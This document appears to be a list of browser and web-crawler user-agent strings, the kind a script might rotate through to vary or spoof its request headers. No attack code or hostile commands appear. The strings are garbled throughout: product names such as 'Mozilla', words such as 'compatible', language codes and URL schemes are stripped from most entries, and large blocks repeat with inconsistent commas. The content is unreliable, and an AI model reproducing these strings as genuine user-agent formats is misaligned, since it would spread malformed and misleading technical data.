	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; "
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A"
	"/5.0 PLAYSTATION 3; 3.55"
	"/5.0 PLAYSTATION 3; 2.00"
	"/5.0 PLAYSTATION 3; 1.00"
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0"
	"/5.0 ; /1.0; +://www.abilogic.com/.html"
	"SiteBar/3.3.8 Bookmark Server; :///"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"/4.0 ;  3.0; Macintosh"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 "
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; "
	"/4.0 ; MSIE 5.5; Windows 98"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322"
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/2.1 ://.com/.html"
	"/9.20 Windows NT 6.0; U; "
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322"
	"/10.00 X11; Linux i686; U;  Presto/2.2.0"
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13"
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0"
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 7.0b; Windows NT 6.0"
	"/4.0 ; MSIE 6.0b; Windows 98"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7"
	"/5.0 ; /2.1; +://.com/.html"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"-; +://.com/; : webetrex"
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620",
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com",
	"/5.0 ; /1.0; +://www.anyapex.com/.html",
	"/4.0 ; Arachmo",
	"/4.0 ; B-l-i--z-B-O-T",
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html",
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html",
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html",
	"/1.0 +://.com/crawler/"
	"/5.0 ; /2.0; +://.com/.htm",
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-",
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots",
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/",
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; ",
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; ",
	"/4.0  /1.0  Link Checker @; ://.com",
	"/4.0  /1.0  Link Checker .dlc@; ://.com",
	"/4.0  /1.0 -@; ://.com",
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko",
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727",
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2",
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; ",
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A",
	"/5.0 PLAYSTATION 3; 3.55",
	"/5.0 PLAYSTATION 3; 2.00",
	"/5.0 PLAYSTATION 3; 1.00",
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0",
	"/5.0 ; /1.0; +://www.abilogic.com/.html",
	"SiteBar/3.3.8 Bookmark Server; :///",
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -",
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -",
	"/4.0 ;  3.0; Macintosh",
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1",
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 ",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; ",
	"/4.0 ; MSIE 5.5; Windows 98",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51",
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322",
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8",
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
